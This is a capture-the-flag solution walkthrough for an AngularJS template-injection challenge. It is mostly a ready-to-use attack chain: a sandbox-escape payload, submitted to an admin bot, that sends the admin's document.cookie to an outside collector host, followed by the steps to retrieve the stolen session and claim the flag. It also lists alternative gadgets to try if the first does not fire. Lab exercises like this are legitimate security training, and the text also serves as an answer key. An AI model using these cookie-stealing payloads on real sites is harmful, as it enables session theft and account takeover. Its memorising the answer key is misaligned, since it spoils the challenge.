Full chain. The gadget's outer string is double-quoted and the inner URL string is
single-quoted, so both quote kinds survive `html.escape` (the browser decodes them
back inside the text node before AngularJS evaluates):

```
POST /report
Content-Type: application/json

{"url":"/?name={{constructor.constructor(\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\")()}}"}
```

(URL-encode the `?name=` value when you build the path, as `tests/exploit.py`
does.)

Wait ~2 seconds for the admin bot to visit the queued path, plus a moment for
AngularJS to bootstrap and run its first digest. Then read what the collector
captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?c=session%3D<32 hex>`. That hex
value is the admin session. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex value or the full
`session=<value>` string.)

If the exact gadget does not fire on this AngularJS build, the app structure is
unchanged — only the expression needs tuning. Equivalent reaches-`Function`
gadgets: `{{$eval.constructor("...")()}}`, `{{[].constructor.constructor("...")()}}`,
or the `toString`/`valueOf` chains.
